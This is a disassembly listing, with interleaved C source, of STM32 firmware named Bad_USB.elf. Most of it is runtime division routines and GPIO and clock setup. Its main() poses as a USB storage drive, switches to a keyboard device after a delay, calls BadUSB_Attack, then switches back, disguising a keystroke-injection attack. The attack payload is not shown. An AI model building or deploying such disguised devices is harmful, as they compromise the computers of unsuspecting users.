
Bad_USB.elf:     file format elf32-littlearm

Sections:
Idx Name          Size      VMA       LMA       File off  Algn
  0 .isr_vector   0000018c  08000000  08000000  00010000  2**0
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  1 .text         0000ceb4  0800018c  0800018c  0001018c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
  2 .rodata       00000198  0800d040  0800d040  0001d040  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  3 .ARM.extab    00000000  0800d1d8  0800d1d8  00020240  2**0
                  CONTENTS
  4 .ARM          00000008  0800d1d8  0800d1d8  0001d1d8  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
  5 .preinit_array 00000000  0800d1e0  0800d1e0  00020240  2**0
                  CONTENTS, ALLOC, LOAD, DATA
  6 .init_array   00000004  0800d1e0  0800d1e0  0001d1e0  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  7 .fini_array   00000004  0800d1e4  0800d1e4  0001d1e4  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  8 .data         00000240  20000000  0800d1e8  00020000  2**2
                  CONTENTS, ALLOC, LOAD, DATA
  9 .bss          00001cd4  20000240  0800d428  00020240  2**2
                  ALLOC
 10 ._user_heap_stack 00001604  20001f14  0800d428  00021f14  2**0
                  ALLOC
 11 .ARM.attributes 00000030  00000000  00000000  00020240  2**0
                  CONTENTS, READONLY
 12 .comment      00000043  00000000  00000000  00020270  2**0
                  CONTENTS, READONLY
 13 .debug_info   0002099d  00000000  00000000  000202b3  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 14 .debug_abbrev 00005371  00000000  00000000  00040c50  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 15 .debug_aranges 00001b30  00000000  00000000  00045fc8  2**3
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 16 .debug_rnglists 000014c0  00000000  00000000  00047af8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 17 .debug_macro  000265ec  00000000  00000000  00048fb8  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 18 .debug_line   00025ae9  00000000  00000000  0006f5a4  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 19 .debug_str    000d23ff  00000000  00000000  0009508d  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 20 .debug_frame  00006f48  00000000  00000000  0016748c  2**2
                  CONTENTS, READONLY, DEBUGGING, OCTETS
 21 .debug_line_str 00000049  00000000  00000000  0016e3d4  2**0
                  CONTENTS, READONLY, DEBUGGING, OCTETS

Disassembly of section .text:

0800018c <__do_global_dtors_aux>:
 800018c:	b510      	push	{r4, lr}
 800018e:	4c05      	ldr	r4, [pc, #20]	; (80001a4 <__do_global_dtors_aux+0x18>)
 8000190:	7823      	ldrb	r3, [r4, #0]
 8000192:	b933      	cbnz	r3, 80001a2 <__do_global_dtors_aux+0x16>
 8000194:	4b04      	ldr	r3, [pc, #16]	; (80001a8 <__do_global_dtors_aux+0x1c>)
 8000196:	b113      	cbz	r3, 800019e <__do_global_dtors_aux+0x12>
 8000198:	4804      	ldr	r0, [pc, #16]	; (80001ac <__do_global_dtors_aux+0x20>)
 800019a:	f3af 8000 	nop.w
 800019e:	2301      	movs	r3, #1
 80001a0:	7023      	strb	r3, [r4, #0]
 80001a2:	bd10      	pop	{r4, pc}
 80001a4:	20000240 	.word	0x20000240
 80001a8:	00000000 	.word	0x00000000
 80001ac:	0800d028 	.word	0x0800d028

080001b0 <frame_dummy>:
 80001b0:	b508      	push	{r3, lr}
 80001b2:	4b03      	ldr	r3, [pc, #12]	; (80001c0 <frame_dummy+0x10>)
 80001b4:	b11b      	cbz	r3, 80001be <frame_dummy+0xe>
 80001b6:	4903      	ldr	r1, [pc, #12]	; (80001c4 <frame_dummy+0x14>)
 80001b8:	4803      	ldr	r0, [pc, #12]	; (80001c8 <frame_dummy+0x18>)
 80001ba:	f3af 8000 	nop.w
 80001be:	bd08      	pop	{r3, pc}
 80001c0:	00000000 	.word	0x00000000
 80001c4:	20000244 	.word	0x20000244
 80001c8:	0800d028 	.word	0x0800d028

080001cc <strlen>:
 80001cc:	4603      	mov	r3, r0
 80001ce:	f813 2b01 	ldrb.w	r2, [r3], #1
 80001d2:	2a00      	cmp	r2, #0
 80001d4:	d1fb      	bne.n	80001ce <strlen+0x2>
 80001d6:	1a18      	subs	r0, r3, r0
 80001d8:	3801      	subs	r0, #1
 80001da:	4770      	bx	lr

080001dc <__aeabi_uldivmod>:
 80001dc:	b953      	cbnz	r3, 80001f4 <__aeabi_uldivmod+0x18>
 80001de:	b94a      	cbnz	r2, 80001f4 <__aeabi_uldivmod+0x18>
 80001e0:	2900      	cmp	r1, #0
 80001e2:	bf08      	it	eq
 80001e4:	2800      	cmpeq	r0, #0
 80001e6:	bf1c      	itt	ne
 80001e8:	f04f 31ff 	movne.w	r1, #4294967295
 80001ec:	f04f 30ff 	movne.w	r0, #4294967295
 80001f0:	f000 b970 	b.w	80004d4 <__aeabi_idiv0>
 80001f4:	f1ad 0c08 	sub.w	ip, sp, #8
 80001f8:	e96d ce04 	strd	ip, lr, [sp, #-16]!
 80001fc:	f000 f806 	bl	800020c <__udivmoddi4>
 8000200:	f8dd e004 	ldr.w	lr, [sp, #4]
 8000204:	e9dd 2302 	ldrd	r2, r3, [sp, #8]
 8000208:	b004      	add	sp, #16
 800020a:	4770      	bx	lr

0800020c <__udivmoddi4>:
 800020c:	e92d 47f0 	stmdb	sp!, {r4, r5, r6, r7, r8, r9, sl, lr}
 8000210:	9e08      	ldr	r6, [sp, #32]
 8000212:	460d      	mov	r5, r1
 8000214:	4604      	mov	r4, r0
 8000216:	460f      	mov	r7, r1
 8000218:	2b00      	cmp	r3, #0
 800021a:	d14a      	bne.n	80002b2 <__udivmoddi4+0xa6>
 800021c:	428a      	cmp	r2, r1
 800021e:	4694      	mov	ip, r2
 8000220:	d965      	bls.n	80002ee <__udivmoddi4+0xe2>
 8000222:	fab2 f382 	clz	r3, r2
 8000226:	b143      	cbz	r3, 800023a <__udivmoddi4+0x2e>
 8000228:	fa02 fc03 	lsl.w	ip, r2, r3
 800022c:	f1c3 0220 	rsb	r2, r3, #32
 8000230:	409f      	lsls	r7, r3
 8000232:	fa20 f202 	lsr.w	r2, r0, r2
 8000236:	4317      	orrs	r7, r2
 8000238:	409c      	lsls	r4, r3
 800023a:	ea4f 4e1c 	mov.w	lr, ip, lsr #16
 800023e:	fa1f f58c 	uxth.w	r5, ip
 8000242:	fbb7 f1fe 	udiv	r1, r7, lr
 8000246:	0c22      	lsrs	r2, r4, #16
 8000248:	fb0e 7711 	mls	r7, lr, r1, r7
 800024c:	ea42 4207 	orr.w	r2, r2, r7, lsl #16
 8000250:	fb01 f005 	mul.w	r0, r1, r5
 8000254:	4290      	cmp	r0, r2
 8000256:	d90a      	bls.n	800026e <__udivmoddi4+0x62>
 8000258:	eb1c 0202 	adds.w	r2, ip, r2
 800025c:	f101 37ff 	add.w	r7, r1, #4294967295
 8000260:	f080 811c 	bcs.w	800049c <__udivmoddi4+0x290>
 8000264:	4290      	cmp	r0, r2
 8000266:	f240 8119 	bls.w	800049c <__udivmoddi4+0x290>
 800026a:	3902      	subs	r1, #2
 800026c:	4462      	add	r2, ip
 800026e:	1a12      	subs	r2, r2, r0
 8000270:	b2a4      	uxth	r4, r4
 8000272:	fbb2 f0fe 	udiv	r0, r2, lr
 8000276:	fb0e 2210 	mls	r2, lr, r0, r2
 800027a:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 800027e:	fb00 f505 	mul.w	r5, r0, r5
 8000282:	42a5      	cmp	r5, r4
 8000284:	d90a      	bls.n	800029c <__udivmoddi4+0x90>
 8000286:	eb1c 0404 	adds.w	r4, ip, r4
 800028a:	f100 32ff 	add.w	r2, r0, #4294967295
 800028e:	f080 8107 	bcs.w	80004a0 <__udivmoddi4+0x294>
 8000292:	42a5      	cmp	r5, r4
 8000294:	f240 8104 	bls.w	80004a0 <__udivmoddi4+0x294>
 8000298:	4464      	add	r4, ip
 800029a:	3802      	subs	r0, #2
 800029c:	ea40 4001 	orr.w	r0, r0, r1, lsl #16
 80002a0:	1b64      	subs	r4, r4, r5
 80002a2:	2100      	movs	r1, #0
 80002a4:	b11e      	cbz	r6, 80002ae <__udivmoddi4+0xa2>
 80002a6:	40dc      	lsrs	r4, r3
 80002a8:	2300      	movs	r3, #0
 80002aa:	e9c6 4300 	strd	r4, r3, [r6]
 80002ae:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002b2:	428b      	cmp	r3, r1
 80002b4:	d908      	bls.n	80002c8 <__udivmoddi4+0xbc>
 80002b6:	2e00      	cmp	r6, #0
 80002b8:	f000 80ed 	beq.w	8000496 <__udivmoddi4+0x28a>
 80002bc:	2100      	movs	r1, #0
 80002be:	e9c6 0500 	strd	r0, r5, [r6]
 80002c2:	4608      	mov	r0, r1
 80002c4:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 80002c8:	fab3 f183 	clz	r1, r3
 80002cc:	2900      	cmp	r1, #0
 80002ce:	d149      	bne.n	8000364 <__udivmoddi4+0x158>
 80002d0:	42ab      	cmp	r3, r5
 80002d2:	d302      	bcc.n	80002da <__udivmoddi4+0xce>
 80002d4:	4282      	cmp	r2, r0
 80002d6:	f200 80f8 	bhi.w	80004ca <__udivmoddi4+0x2be>
 80002da:	1a84      	subs	r4, r0, r2
 80002dc:	eb65 0203 	sbc.w	r2, r5, r3
 80002e0:	2001      	movs	r0, #1
 80002e2:	4617      	mov	r7, r2
 80002e4:	2e00      	cmp	r6, #0
 80002e6:	d0e2      	beq.n	80002ae <__udivmoddi4+0xa2>
 80002e8:	e9c6 4700 	strd	r4, r7, [r6]
 80002ec:	e7df      	b.n	80002ae <__udivmoddi4+0xa2>
 80002ee:	b902      	cbnz	r2, 80002f2 <__udivmoddi4+0xe6>
 80002f0:	deff      	udf	#255	; 0xff
 80002f2:	fab2 f382 	clz	r3, r2
 80002f6:	2b00      	cmp	r3, #0
 80002f8:	f040 8090 	bne.w	800041c <__udivmoddi4+0x210>
 80002fc:	1a8a      	subs	r2, r1, r2
 80002fe:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000302:	fa1f fe8c 	uxth.w	lr, ip
 8000306:	2101      	movs	r1, #1
 8000308:	fbb2 f5f7 	udiv	r5, r2, r7
 800030c:	fb07 2015 	mls	r0, r7, r5, r2
 8000310:	0c22      	lsrs	r2, r4, #16
 8000312:	ea42 4200 	orr.w	r2, r2, r0, lsl #16
 8000316:	fb0e f005 	mul.w	r0, lr, r5
 800031a:	4290      	cmp	r0, r2
 800031c:	d908      	bls.n	8000330 <__udivmoddi4+0x124>
 800031e:	eb1c 0202 	adds.w	r2, ip, r2
 8000322:	f105 38ff 	add.w	r8, r5, #4294967295
 8000326:	d202      	bcs.n	800032e <__udivmoddi4+0x122>
 8000328:	4290      	cmp	r0, r2
 800032a:	f200 80cb 	bhi.w	80004c4 <__udivmoddi4+0x2b8>
 800032e:	4645      	mov	r5, r8
 8000330:	1a12      	subs	r2, r2, r0
 8000332:	b2a4      	uxth	r4, r4
 8000334:	fbb2 f0f7 	udiv	r0, r2, r7
 8000338:	fb07 2210 	mls	r2, r7, r0, r2
 800033c:	ea44 4402 	orr.w	r4, r4, r2, lsl #16
 8000340:	fb0e fe00 	mul.w	lr, lr, r0
 8000344:	45a6      	cmp	lr, r4
 8000346:	d908      	bls.n	800035a <__udivmoddi4+0x14e>
 8000348:	eb1c 0404 	adds.w	r4, ip, r4
 800034c:	f100 32ff 	add.w	r2, r0, #4294967295
 8000350:	d202      	bcs.n	8000358 <__udivmoddi4+0x14c>
 8000352:	45a6      	cmp	lr, r4
 8000354:	f200 80bb 	bhi.w	80004ce <__udivmoddi4+0x2c2>
 8000358:	4610      	mov	r0, r2
 800035a:	eba4 040e 	sub.w	r4, r4, lr
 800035e:	ea40 4005 	orr.w	r0, r0, r5, lsl #16
 8000362:	e79f      	b.n	80002a4 <__udivmoddi4+0x98>
 8000364:	f1c1 0720 	rsb	r7, r1, #32
 8000368:	408b      	lsls	r3, r1
 800036a:	fa22 fc07 	lsr.w	ip, r2, r7
 800036e:	ea4c 0c03 	orr.w	ip, ip, r3
 8000372:	fa05 f401 	lsl.w	r4, r5, r1
 8000376:	fa20 f307 	lsr.w	r3, r0, r7
 800037a:	40fd      	lsrs	r5, r7
 800037c:	ea4f 491c 	mov.w	r9, ip, lsr #16
 8000380:	4323      	orrs	r3, r4
 8000382:	fbb5 f8f9 	udiv	r8, r5, r9
 8000386:	fa1f fe8c 	uxth.w	lr, ip
 800038a:	fb09 5518 	mls	r5, r9, r8, r5
 800038e:	0c1c      	lsrs	r4, r3, #16
 8000390:	ea44 4405 	orr.w	r4, r4, r5, lsl #16
 8000394:	fb08 f50e 	mul.w	r5, r8, lr
 8000398:	42a5      	cmp	r5, r4
 800039a:	fa02 f201 	lsl.w	r2, r2, r1
 800039e:	fa00 f001 	lsl.w	r0, r0, r1
 80003a2:	d90b      	bls.n	80003bc <__udivmoddi4+0x1b0>
 80003a4:	eb1c 0404 	adds.w	r4, ip, r4
 80003a8:	f108 3aff 	add.w	sl, r8, #4294967295
 80003ac:	f080 8088 	bcs.w	80004c0 <__udivmoddi4+0x2b4>
 80003b0:	42a5      	cmp	r5, r4
 80003b2:	f240 8085 	bls.w	80004c0 <__udivmoddi4+0x2b4>
 80003b6:	f1a8 0802 	sub.w	r8, r8, #2
 80003ba:	4464      	add	r4, ip
 80003bc:	1b64      	subs	r4, r4, r5
 80003be:	b29d      	uxth	r5, r3
 80003c0:	fbb4 f3f9 	udiv	r3, r4, r9
 80003c4:	fb09 4413 	mls	r4, r9, r3, r4
 80003c8:	ea45 4404 	orr.w	r4, r5, r4, lsl #16
 80003cc:	fb03 fe0e 	mul.w	lr, r3, lr
 80003d0:	45a6      	cmp	lr, r4
 80003d2:	d908      	bls.n	80003e6 <__udivmoddi4+0x1da>
 80003d4:	eb1c 0404 	adds.w	r4, ip, r4
 80003d8:	f103 35ff 	add.w	r5, r3, #4294967295
 80003dc:	d26c      	bcs.n	80004b8 <__udivmoddi4+0x2ac>
 80003de:	45a6      	cmp	lr, r4
 80003e0:	d96a      	bls.n	80004b8 <__udivmoddi4+0x2ac>
 80003e2:	3b02      	subs	r3, #2
 80003e4:	4464      	add	r4, ip
 80003e6:	ea43 4308 	orr.w	r3, r3, r8, lsl #16
 80003ea:	fba3 9502 	umull	r9, r5, r3, r2
 80003ee:	eba4 040e 	sub.w	r4, r4, lr
 80003f2:	42ac      	cmp	r4, r5
 80003f4:	46c8      	mov	r8, r9
 80003f6:	46ae      	mov	lr, r5
 80003f8:	d356      	bcc.n	80004a8 <__udivmoddi4+0x29c>
 80003fa:	d053      	beq.n	80004a4 <__udivmoddi4+0x298>
 80003fc:	b156      	cbz	r6, 8000414 <__udivmoddi4+0x208>
 80003fe:	ebb0 0208 	subs.w	r2, r0, r8
 8000402:	eb64 040e 	sbc.w	r4, r4, lr
 8000406:	fa04 f707 	lsl.w	r7, r4, r7
 800040a:	40ca      	lsrs	r2, r1
 800040c:	40cc      	lsrs	r4, r1
 800040e:	4317      	orrs	r7, r2
 8000410:	e9c6 7400 	strd	r7, r4, [r6]
 8000414:	4618      	mov	r0, r3
 8000416:	2100      	movs	r1, #0
 8000418:	e8bd 87f0 	ldmia.w	sp!, {r4, r5, r6, r7, r8, r9, sl, pc}
 800041c:	f1c3 0120 	rsb	r1, r3, #32
 8000420:	fa02 fc03 	lsl.w	ip, r2, r3
 8000424:	fa20 f201 	lsr.w	r2, r0, r1
 8000428:	fa25 f101 	lsr.w	r1, r5, r1
 800042c:	409d      	lsls	r5, r3
 800042e:	432a      	orrs	r2, r5
 8000430:	ea4f 471c 	mov.w	r7, ip, lsr #16
 8000434:	fa1f fe8c 	uxth.w	lr, ip
 8000438:	fbb1 f0f7 	udiv	r0, r1, r7
 800043c:	fb07 1510 	mls	r5, r7, r0, r1
 8000440:	0c11      	lsrs	r1, r2, #16
 8000442:	ea41 4105 	orr.w	r1, r1, r5, lsl #16
 8000446:	fb00 f50e 	mul.w	r5, r0, lr
 800044a:	428d      	cmp	r5, r1
 800044c:	fa04 f403 	lsl.w	r4, r4, r3
 8000450:	d908      	bls.n	8000464 <__udivmoddi4+0x258>
 8000452:	eb1c 0101 	adds.w	r1, ip, r1
 8000456:	f100 38ff 	add.w	r8, r0, #4294967295
 800045a:	d22f      	bcs.n	80004bc <__udivmoddi4+0x2b0>
 800045c:	428d      	cmp	r5, r1
 800045e:	d92d      	bls.n	80004bc <__udivmoddi4+0x2b0>
 8000460:	3802      	subs	r0, #2
 8000462:	4461      	add	r1, ip
 8000464:	1b49      	subs	r1, r1, r5
 8000466:	b292      	uxth	r2, r2
 8000468:	fbb1 f5f7 	udiv	r5, r1, r7
 800046c:	fb07 1115 	mls	r1, r7, r5, r1
 8000470:	ea42 4201 	orr.w	r2, r2, r1, lsl #16
 8000474:	fb05 f10e 	mul.w	r1, r5, lr
 8000478:	4291      	cmp	r1, r2
 800047a:	d908      	bls.n	800048e <__udivmoddi4+0x282>
 800047c:	eb1c 0202 	adds.w	r2, ip, r2
 8000480:	f105 38ff 	add.w	r8, r5, #4294967295
 8000484:	d216      	bcs.n	80004b4 <__udivmoddi4+0x2a8>
 8000486:	4291      	cmp	r1, r2
 8000488:	d914      	bls.n	80004b4 <__udivmoddi4+0x2a8>
 800048a:	3d02      	subs	r5, #2
 800048c:	4462      	add	r2, ip
 800048e:	1a52      	subs	r2, r2, r1
 8000490:	ea45 4100 	orr.w	r1, r5, r0, lsl #16
 8000494:	e738      	b.n	8000308 <__udivmoddi4+0xfc>
 8000496:	4631      	mov	r1, r6
 8000498:	4630      	mov	r0, r6
 800049a:	e708      	b.n	80002ae <__udivmoddi4+0xa2>
 800049c:	4639      	mov	r1, r7
 800049e:	e6e6      	b.n	800026e <__udivmoddi4+0x62>
 80004a0:	4610      	mov	r0, r2
 80004a2:	e6fb      	b.n	800029c <__udivmoddi4+0x90>
 80004a4:	4548      	cmp	r0, r9
 80004a6:	d2a9      	bcs.n	80003fc <__udivmoddi4+0x1f0>
 80004a8:	ebb9 0802 	subs.w	r8, r9, r2
 80004ac:	eb65 0e0c 	sbc.w	lr, r5, ip
 80004b0:	3b01      	subs	r3, #1
 80004b2:	e7a3      	b.n	80003fc <__udivmoddi4+0x1f0>
 80004b4:	4645      	mov	r5, r8
 80004b6:	e7ea      	b.n	800048e <__udivmoddi4+0x282>
 80004b8:	462b      	mov	r3, r5
 80004ba:	e794      	b.n	80003e6 <__udivmoddi4+0x1da>
 80004bc:	4640      	mov	r0, r8
 80004be:	e7d1      	b.n	8000464 <__udivmoddi4+0x258>
 80004c0:	46d0      	mov	r8, sl
 80004c2:	e77b      	b.n	80003bc <__udivmoddi4+0x1b0>
 80004c4:	3d02      	subs	r5, #2
 80004c6:	4462      	add	r2, ip
 80004c8:	e732      	b.n	8000330 <__udivmoddi4+0x124>
 80004ca:	4608      	mov	r0, r1
 80004cc:	e70a      	b.n	80002e4 <__udivmoddi4+0xd8>
 80004ce:	4464      	add	r4, ip
 80004d0:	3802      	subs	r0, #2
 80004d2:	e742      	b.n	800035a <__udivmoddi4+0x14e>

080004d4 <__aeabi_idiv0>:
 80004d4:	4770      	bx	lr
 80004d6:	bf00      	nop

080004d8 <MX_GPIO_Init>:
        * Output
        * EVENT_OUT
        * EXTI
*/
void MX_GPIO_Init(void)
{
 80004d8:	b580      	push	{r7, lr}
 80004da:	b088      	sub	sp, #32
 80004dc:	af00      	add	r7, sp, #0

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 80004de:	f107 030c 	add.w	r3, r7, #12
 80004e2:	2200      	movs	r2, #0
 80004e4:	601a      	str	r2, [r3, #0]
 80004e6:	605a      	str	r2, [r3, #4]
 80004e8:	609a      	str	r2, [r3, #8]
 80004ea:	60da      	str	r2, [r3, #12]
 80004ec:	611a      	str	r2, [r3, #16]

  /* GPIO Ports Clock Enable */
  __HAL_RCC_GPIOC_CLK_ENABLE();
 80004ee:	4b24      	ldr	r3, [pc, #144]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f0:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004f2:	4a23      	ldr	r2, [pc, #140]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004f4:	f043 0304 	orr.w	r3, r3, #4
 80004f8:	64d3      	str	r3, [r2, #76]	; 0x4c
 80004fa:	4b21      	ldr	r3, [pc, #132]	; (8000580 <MX_GPIO_Init+0xa8>)
 80004fc:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80004fe:	f003 0304 	and.w	r3, r3, #4
 8000502:	60bb      	str	r3, [r7, #8]
 8000504:	68bb      	ldr	r3, [r7, #8]
  __HAL_RCC_GPIOA_CLK_ENABLE();
 8000506:	4b1e      	ldr	r3, [pc, #120]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000508:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800050a:	4a1d      	ldr	r2, [pc, #116]	; (8000580 <MX_GPIO_Init+0xa8>)
 800050c:	f043 0301 	orr.w	r3, r3, #1
 8000510:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000512:	4b1b      	ldr	r3, [pc, #108]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000514:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000516:	f003 0301 	and.w	r3, r3, #1
 800051a:	607b      	str	r3, [r7, #4]
 800051c:	687b      	ldr	r3, [r7, #4]
  __HAL_RCC_GPIOB_CLK_ENABLE();
 800051e:	4b18      	ldr	r3, [pc, #96]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000520:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000522:	4a17      	ldr	r2, [pc, #92]	; (8000580 <MX_GPIO_Init+0xa8>)
 8000524:	f043 0302 	orr.w	r3, r3, #2
 8000528:	64d3      	str	r3, [r2, #76]	; 0x4c
 800052a:	4b15      	ldr	r3, [pc, #84]	; (8000580 <MX_GPIO_Init+0xa8>)
 800052c:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 800052e:	f003 0302 	and.w	r3, r3, #2
 8000532:	603b      	str	r3, [r7, #0]
 8000534:	683b      	ldr	r3, [r7, #0]

  /*Configure GPIO pin Output Level */
  HAL_GPIO_WritePin(GPIOB, SPI1_CS_Pin|LD3_Pin, GPIO_PIN_SET);
 8000536:	2201      	movs	r2, #1
 8000538:	2109      	movs	r1, #9
 800053a:	4812      	ldr	r0, [pc, #72]	; (8000584 <MX_GPIO_Init+0xac>)
 800053c:	f001 fb48 	bl	8001bd0 <HAL_GPIO_WritePin>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = SPI1_CS_Pin;
 8000540:	2301      	movs	r3, #1
 8000542:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000544:	2301      	movs	r3, #1
 8000546:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_PULLUP;
 8000548:	2301      	movs	r3, #1
 800054a:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 800054c:	2300      	movs	r3, #0
 800054e:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(SPI1_CS_GPIO_Port, &GPIO_InitStruct);
 8000550:	f107 030c 	add.w	r3, r7, #12
 8000554:	4619      	mov	r1, r3
 8000556:	480b      	ldr	r0, [pc, #44]	; (8000584 <MX_GPIO_Init+0xac>)
 8000558:	f001 f9d0 	bl	80018fc <HAL_GPIO_Init>

  /*Configure GPIO pin : PtPin */
  GPIO_InitStruct.Pin = LD3_Pin;
 800055c:	2308      	movs	r3, #8
 800055e:	60fb      	str	r3, [r7, #12]
  GPIO_InitStruct.Mode = GPIO_MODE_OUTPUT_PP;
 8000560:	2301      	movs	r3, #1
 8000562:	613b      	str	r3, [r7, #16]
  GPIO_InitStruct.Pull = GPIO_NOPULL;
 8000564:	2300      	movs	r3, #0
 8000566:	617b      	str	r3, [r7, #20]
  GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_LOW;
 8000568:	2300      	movs	r3, #0
 800056a:	61bb      	str	r3, [r7, #24]
  HAL_GPIO_Init(LD3_GPIO_Port, &GPIO_InitStruct);
 800056c:	f107 030c 	add.w	r3, r7, #12
 8000570:	4619      	mov	r1, r3
 8000572:	4804      	ldr	r0, [pc, #16]	; (8000584 <MX_GPIO_Init+0xac>)
 8000574:	f001 f9c2 	bl	80018fc <HAL_GPIO_Init>

}
 8000578:	bf00      	nop
 800057a:	3720      	adds	r7, #32
 800057c:	46bd      	mov	sp, r7
 800057e:	bd80      	pop	{r7, pc}
 8000580:	40021000 	.word	0x40021000
 8000584:	48000400 	.word	0x48000400

08000588 <main>:
/**
  * @brief  The application entry point.
  * @retval int
  */
int main(void)
{
 8000588:	b580      	push	{r7, lr}
 800058a:	b082      	sub	sp, #8
 800058c:	af00      	add	r7, sp, #0
  /* USER CODE END 1 */

  /* MCU Configuration--------------------------------------------------------*/

  /* Reset of all peripherals, Initializes the Flash interface and the Systick. */
  HAL_Init();
 800058e:	f000 fd92 	bl	80010b6 <HAL_Init>
  /* USER CODE BEGIN Init */

  /* USER CODE END Init */

  /* Configure the system clock */
  SystemClock_Config();
 8000592:	f000 f833 	bl	80005fc <SystemClock_Config>
  /* USER CODE BEGIN SysInit */

  /* USER CODE END SysInit */

  /* Initialize all configured peripherals */
  MX_GPIO_Init();
 8000596:	f7ff ff9f 	bl	80004d8 <MX_GPIO_Init>
  MX_USART2_UART_Init();
 800059a:	f000 fcc9 	bl	8000f30 <MX_USART2_UART_Init>
  MX_SPI1_Init();
 800059e:	f000 fb61 	bl	8000c64 <MX_SPI1_Init>
  /* USER CODE BEGIN 2 */
  int flag = 0;
 80005a2:	2300      	movs	r3, #0
 80005a4:	607b      	str	r3, [r7, #4]
  isMSC = 1;
 80005a6:	4b12      	ldr	r3, [pc, #72]	; (80005f0 <main+0x68>)
 80005a8:	2201      	movs	r2, #1
 80005aa:	601a      	str	r2, [r3, #0]
  MX_USB_DEVICE_Init_MSC();
 80005ac:	f00b fefa 	bl	800c3a4 <MX_USB_DEVICE_Init_MSC>

  memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 80005b0:	220f      	movs	r2, #15
 80005b2:	2100      	movs	r1, #0
 80005b4:	480f      	ldr	r0, [pc, #60]	; (80005f4 <main+0x6c>)
 80005b6:	f00c fcfd 	bl	800cfb4 <memset>

  flag = 1;
 80005ba:	2301      	movs	r3, #1
 80005bc:	607b      	str	r3, [r7, #4]
  /* USER CODE END 2 */

  /* Infinite loop */
  /* USER CODE BEGIN WHILE */
  while(1){
	  InterruptTrap(&InterruptFlag);
 80005be:	480e      	ldr	r0, [pc, #56]	; (80005f8 <main+0x70>)
 80005c0:	f000 fa40 	bl	8000a44 <InterruptTrap>

	  if(flag == 1){
 80005c4:	687b      	ldr	r3, [r7, #4]
 80005c6:	2b01      	cmp	r3, #1
 80005c8:	d1f9      	bne.n	80005be <main+0x36>
		  HAL_Delay(10000); //random slot to switch HID
 80005ca:	f242 7010 	movw	r0, #10000	; 0x2710
 80005ce:	f000 fde7 	bl	80011a0 <HAL_Delay>
		  SwitchToHID();
 80005d2:	f000 f88b 	bl	80006ec <SwitchToHID>
		  HAL_Delay(2000); //test Device Manager linux 2000
 80005d6:	f44f 60fa 	mov.w	r0, #2000	; 0x7d0
 80005da:	f000 fde1 	bl	80011a0 <HAL_Delay>
		  //Attack begin
		  BadUSB_Attack(0);
 80005de:	2000      	movs	r0, #0
 80005e0:	f000 fa4e 	bl	8000a80 <BadUSB_Attack>

		  flag = 0;
 80005e4:	2300      	movs	r3, #0
 80005e6:	607b      	str	r3, [r7, #4]
		  SwitchToMSC();
 80005e8:	f000 f894 	bl	8000714 <SwitchToMSC>
	  InterruptTrap(&InterruptFlag);
 80005ec:	e7e7      	b.n	80005be <main+0x36>
 80005ee:	bf00      	nop
 80005f0:	20000978 	.word	0x20000978
 80005f4:	2000025c 	.word	0x2000025c
 80005f8:	20000270 	.word	0x20000270

080005fc <SystemClock_Config>:
/**
  * @brief System Clock Configuration
  * @retval None
  */
void SystemClock_Config(void)
{
 80005fc:	b580      	push	{r7, lr}
 80005fe:	b096      	sub	sp, #88	; 0x58
 8000600:	af00      	add	r7, sp, #0
  RCC_OscInitTypeDef RCC_OscInitStruct = {0};
 8000602:	f107 0314 	add.w	r3, r7, #20
 8000606:	2244      	movs	r2, #68	; 0x44
 8000608:	2100      	movs	r1, #0
 800060a:	4618      	mov	r0, r3
 800060c:	f00c fcd2 	bl	800cfb4 <memset>
  RCC_ClkInitTypeDef RCC_ClkInitStruct = {0};
 8000610:	463b      	mov	r3, r7
 8000612:	2200      	movs	r2, #0
 8000614:	601a      	str	r2, [r3, #0]
 8000616:	605a      	str	r2, [r3, #4]
 8000618:	609a      	str	r2, [r3, #8]
 800061a:	60da      	str	r2, [r3, #12]
 800061c:	611a      	str	r2, [r3, #16]

  /** Configure the main internal regulator output voltage
  */
  if (HAL_PWREx_ControlVoltageScaling(PWR_REGULATOR_VOLTAGE_SCALE1) != HAL_OK)
 800061e:	f44f 7000 	mov.w	r0, #512	; 0x200
 8000622:	f003 f8cf 	bl	80037c4 <HAL_PWREx_ControlVoltageScaling>
 8000626:	4603      	mov	r3, r0
 8000628:	2b00      	cmp	r3, #0
 800062a:	d001      	beq.n	8000630 <SystemClock_Config+0x34>
  {
